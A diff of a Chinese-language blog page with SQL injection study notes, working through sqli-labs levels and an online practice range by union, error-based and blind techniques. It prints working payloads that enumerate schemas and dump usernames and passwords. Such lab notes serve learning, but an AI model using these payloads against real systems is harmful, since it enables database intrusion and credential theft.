@@ -147,7 +147,7 @@ MathJax = {
 <p>也就是说，SQL命令就是前端应用程序和后端数据库之间的接口。</p>
 <p>静态网页：html或htm，不存在交互，不存在SQL注入漏洞。</p>
 <p>伪静态网页：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\1.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\1.png" alt></p>
 <h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>1.数据与代码未严格分离</p>
 <p>2.用户提交的参数数据未做充分检查过滤即被代入到SQL命令中，从而改变原有SQL命令的语义，且被数据库成功执行。</p>
 <h2 id="常见过程"><a href="#常见过程" class="headerlink" title="常见过程"></a>常见过程</h2><p>1.客户端（发送请求）：用户请求URL，但用户对其中的参数值等数据进行修改</p>
@@ -193,173 +193,173 @@ MathJax = {
 <p>​        table_schema字段下是所有表名对应的数据库名</p>
 <p>​    columns表：</p>
 <p>​        colum_name字段下是所有数据库存在的字段名。</p>
-<p>​        columns_schema字段下是所有表名对应的数据库。<br><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\2.png" style="zoom: 67%;"></p>
+<p>​        columns_schema字段下是所有表名对应的数据库。<br><img src="/F:/blog\source\_posts\漏洞part\2.png" style="zoom: 67%;"></p>
 <p>在如下目录中cmd，进入mysql：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\21.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\22.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\23.png" style="zoom:80%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\24.png" style="zoom:67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\21.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\22.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\23.png" style="zoom:80%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\24.png" style="zoom:67%;"></p>
 <p>（2）SQL注入类型</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\4.png" style="zoom: 67%;">、</p>
+<p><img src="/F:/blog\source\_posts\漏洞part\4.png" style="zoom: 67%;">、</p>
 <p>（3）联合查询</p>
 <p>联合注入<strong>思路</strong>：</p>
 <p>union联合</p>
 <p>合并：将多条查询语句的结合并成一个结果，union注入攻击位一种手工测试。</p>
 <p>联合注入<strong>步骤</strong>：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\3.png" style="zoom:67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\3.png" style="zoom:67%;"></p>
 <p>（4）其中空格编码为20%，’编码为27%\</p>
 <h3 id="SQL注入类型——联合查询（Less-1，2，3，4）"><a href="#SQL注入类型——联合查询（Less-1，2，3，4）" class="headerlink" title="SQL注入类型——联合查询（Less-1，2，3，4）"></a>SQL注入类型——联合查询（Less-1，2，3，4）</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>登录靶场，目标找账号密码，第一关显示如下：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\5.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\5.png" alt></p>
 <p>提示输入数字值的ID作为参数，输入?id=1</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\6.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\6.png" alt></p>
 <p>为了显示方便，添加代码以便显示语句：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\7.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\8.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\7.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\8.png" alt></p>
 <h5 id="first"><a href="#first" class="headerlink" title="first"></a>first</h5><p>一般都先在语句后加’，判断是否有sql注入，求闭合字符：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\9.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\9.png" alt></p>
 <p>发现报错（界面变化），证明该网站和数据库确实有交互，进一步开始找漏洞</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\10.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\12.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\10.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\12.png" alt></p>
 <p>and 1=1和and 1=2出现不同结果，说明闭合字符寻找正确，即为’</p>
 <p>且因为该页面存在回显，所以我们可以使用联合查询</p>
 <p>其中</p>
 <p>and中若一方是false就报错</p>
 <p>看源码便于理解：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\11.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\11.png" alt></p>
 <p>在箭头处进行注入</p>
 <h5 id="second"><a href="#second" class="headerlink" title="second"></a>second</h5><p>求列数</p>
 <p>当为3时显示正常，为4时报错，即表示太多了，即确定为3列</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\18.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\19.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\18.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\19.png" alt></p>
 <h5 id="third"><a href="#third" class="headerlink" title="third"></a>third</h5><p>联合查询求显示位</p>
 <p>发现只显示id=1时的值，其他显示不出</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\20.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\20.png" alt></p>
 <p>故修改命令，让其显示后面的内容：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\25.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\25.png" alt></p>
 <h5 id="forth"><a href="#forth" class="headerlink" title="forth"></a>forth</h5><p>爆库——爆表——爆列——爆段</p>
 <p>说明该网页使用security数据库：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\26.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\26.png" alt></p>
 <p>看了表名不止一个，因此需要用连接符连接，from后跟表名存在的位置，这样查出了数据库中所有的表名：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\27.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\27.png" alt></p>
 <p>故用where后跟条件(查表名，即条件为表存在哪个数据库中)，定位到security数据库：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\28.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\28.png" alt></p>
 <p>若未使用group_concat()：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\29.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\29.png" alt></p>
 <p>用limit让其一个表一个表读（limit参数从0开始，后面一个参数’1’表示接下来显示1个表），此时显示：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\30.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\31.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\32.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\30.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\31.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\32.png" alt></p>
 <p>把table改为column，加上限制条件（从users表中查）：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\33.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\33.png" alt></p>
 <p>最后把column改为username、password，from users表中：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,(select group_concat(username,password) from users) --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\34.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\34.png" alt></p>
 <h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>提示显示同第一关，先加’，结果显示与数据库有交互</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\13.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\13.png" alt></p>
 <p>输入and 1=1，发现结果报错，说明闭合字符有问题：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\14.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\14.png" alt></p>
 <p>故去掉’，发现显示正常，说明不需要闭合字符，为数字型：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\15.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\16.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\15.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\16.png" alt></p>
 <h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>提示显示同第一关，先加’，结果显示与数据库有交互</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\17.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\17.png" alt></p>
 <h4 id="sql注入练习"><a href="#sql注入练习" class="headerlink" title="sql注入练习"></a>sql注入练习</h4><p><a target="_blank" rel="noopener" href="http://pu2lh35s.ia.aqlab.cn/">http://pu2lh35s.ia.aqlab.cn/</a></p>
 <p>初始界面如下，仅一处可点：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\44.png" style="zoom: 50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\44.png" style="zoom: 50%;"></p>
 <p>点击后出现如下结果（正常页面）：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\45.png" style="zoom: 50%;"></p>
-<p>接着用’判断是否存在sql注入，发现页面发生变化（错误页面）：<br><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\46.png" style="zoom: 67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\45.png" style="zoom: 50%;"></p>
+<p>接着用’判断是否存在sql注入，发现页面发生变化（错误页面）：<br><img src="/F:/blog\source\_posts\漏洞part\46.png" style="zoom: 67%;"></p>
 <p>继续测试，发现页面仍有问题，与预期不符，说明闭合方式错误：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\47.png" style="zoom:67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\47.png" style="zoom:67%;"></p>
 <p>说明为数字型：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\48.png" style="zoom:50%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\49.png" style="zoom:67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\48.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\49.png" style="zoom:67%;"></p>
 <p>测出类型后，测列数，说明两个字段有显示：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\50.png" style="zoom:50%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\51.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\50.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\51.png" style="zoom:50%;"></p>
 <p>接下来测具体显示位（联合查询），此时页面没有信息，于是想让前面部分不输出：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\52.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\52.png" style="zoom:50%;"></p>
 <p>找到信息2：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\53.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\53.png" style="zoom:50%;"></p>
 <p>同理：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\54.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\54.png" style="zoom:50%;"></p>
 <p>找到显示位后，先查数据库：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\55.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\55.png" style="zoom:50%;"></p>
 <p>接着查表：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>pu2lh35s.ia.aqlab.cn<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;maoshe&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\56.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\56.png" style="zoom:50%;"></p>
 <p>接着查列：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>pu2lh35s.ia.aqlab.cn<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;maoshe&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\57.png" style="zoom:50%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\58.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\57.png" style="zoom:50%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\58.png" style="zoom:50%;"></p>
 <h3 id="SQL注入类型——报错注入（Less-5，6）"><a href="#SQL注入类型——报错注入（Less-5，6）" class="headerlink" title="SQL注入类型——报错注入（Less-5，6）"></a>SQL注入类型——报错注入（Less-5，6）</h3><p>判断方法：</p>
 <p>页面无回显位</p>
 <p>常用报错函数E</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数</span><br><span class="line">extractvalue()      是mysql对xml文档数据进行查询的xpath函数</span><br><span class="line"><span class="built_in">floor</span>()             mysql中用来取整的函数</span><br><span class="line"><span class="built_in">exp</span>()               此函数返回e(自然对数的底)指数x的幂值</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\35.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\35.png" alt></p>
 <p>其中会用到0x7e（为波浪线的十六进制），作为标记，看是否完全显示完。</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\36.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\36.png" alt></p>
 <p>报错注入步骤：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\37.png" style="zoom: 67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\37.png" style="zoom: 67%;"></p>
 <h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><h5 id="first-1"><a href="#first-1" class="headerlink" title="first"></a>first</h5><p>提示显示同第一关：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\38.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\38.png" alt></p>
 <p>先加’，报错，说明存在交互：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\39.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\39.png" alt></p>
 <p>继续测试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\40.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\41.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\40.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\41.png" alt></p>
 <p>第五关根据页面结果得知是字符型但和前四关不同。页面虽然有东西，但是只有对于请求对错出现不一样页面其余的就没有了，页面无回显位，考虑报错注入。</p>
-<h5 id="second-1"><a href="#second-1" class="headerlink" title="second"></a>second</h5><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\42.png" alt></p>
+<h5 id="second-1"><a href="#second-1" class="headerlink" title="second"></a>second</h5><p><img src="/F:/blog\source\_posts\漏洞part\42.png" alt></p>
 <p>或：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\43.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\43.png" alt></p>
 <h3 id="SQL注入类型——布尔盲注-Less-8"><a href="#SQL注入类型——布尔盲注-Less-8" class="headerlink" title="SQL注入类型——布尔盲注(Less-8)"></a>SQL注入类型——布尔盲注(Less-8)</h3><p>判断方法：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\59.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\59.png" alt></p>
 <p>操作步骤：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\60.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\60.png" alt></p>
 <p>常用函数：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\61.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\61.png" alt></p>
 <p>其中：substr的起始数字为1，括号中第一个数字x表示从第x位开始截取，第二个数字xx表示截取xx位。</p>
 <p>区别limit的起始数字为0。</p>
 <p>acsii对应：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\62.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\62.png" alt></p>
 <h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><h5 id="first-求闭合字符"><a href="#first-求闭合字符" class="headerlink" title="first 求闭合字符"></a>first 求闭合字符</h5><p>起始界面是一样的，但是发现输入’之后没有报错信息，只是界面变化（You are in消失）（与Less-5不同）：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\64.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\64.png" alt></p>
 <p>进行闭合字符检测：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\65.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\66.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\65.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\66.png" alt></p>
 <p>说明’为闭合字符，且无显示位也无报错信息，确定为布尔盲注</p>
 <h5 id="second-求数据库名长度length"><a href="#second-求数据库名长度length" class="headerlink" title="second 求数据库名长度length()"></a>second 求数据库名长度length()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length((<span class="keyword">select</span> database()))</span><br></pre></td></tr></table></figure>
 <p>一般数据库名没有太长（1-10），先用&gt;、&lt;，借助二分法缩小范围，再用=猜数</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\67.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\67.png" alt></p>
 <h5 id="third-求数据库名的ascii值-substr"><a href="#third-求数据库名的ascii值-substr" class="headerlink" title="third 求数据库名的ascii值 substr"></a>third 求数据库名的ascii值 substr</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span></span><br><span class="line"></span><br><span class="line">ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br></pre></td></tr></table></figure>
 <p>第二个数字表示截取位数，固定为1，太麻烦，故利用BP抓包爆破。</p>
 <p>首先打开抓包：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\68.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\68.png" alt></p>
 <p>抓到后，转到爆破模块（右键—&gt;Send to Intruder），通过返回的长度（正确界面和错误界面长度不同）确定结果：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\69.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\69.png" alt></p>
 <p>设置payloads：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\70.png" style="zoom: 67%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\73.png" style="zoom:67%;"></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\74.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\70.png" style="zoom: 67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\73.png" style="zoom:67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\74.png" alt></p>
 <p>对应记录下来：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\71.png" style="zoom:67%;"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\71.png" style="zoom:67%;"></p>
 <p>找ascii：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\72.png"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\72.png"></p>
 <h5 id="forth-求表的数量count"><a href="#forth-求表的数量count" class="headerlink" title="forth 求表的数量count()"></a>forth 求表的数量count()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)=4 --+</span></span><br></pre></td></tr></table></figure>
 <p>求出数量后便于遍历</p>
 <h5 id="fifth-求表的长度"><a href="#fifth-求表的长度" class="headerlink" title="fifth 求表的长度"></a>fifth 求表的长度</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 猜第一个表</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 截取第一个表的第一个字母</span><br><span class="line">substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>
 <p>接下来一个表一个表的爆破</p>
-<h3 id="SQL注入类型——时间盲注-Less-9"><a href="#SQL注入类型——时间盲注-Less-9" class="headerlink" title="SQL注入类型——时间盲注(Less-9)"></a>SQL注入类型——时间盲注(Less-9)</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\63.png" alt></p>
+<h3 id="SQL注入类型——时间盲注-Less-9"><a href="#SQL注入类型——时间盲注-Less-9" class="headerlink" title="SQL注入类型——时间盲注(Less-9)"></a>SQL注入类型——时间盲注(Less-9)</h3><p><img src="/F:/blog\source\_posts\漏洞part\63.png" alt></p>
 <h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><h5 id="first-2"><a href="#first-2" class="headerlink" title="first"></a>first</h5><p>输入’，发现无报错无回显，且页面无变化，不知道是否与数据库有交互</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\75.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\75.png" alt></p>
 <p>用sleep()函数求闭合字符，但要注意排除网络原因（将页面沉睡时间设长一些）</p>
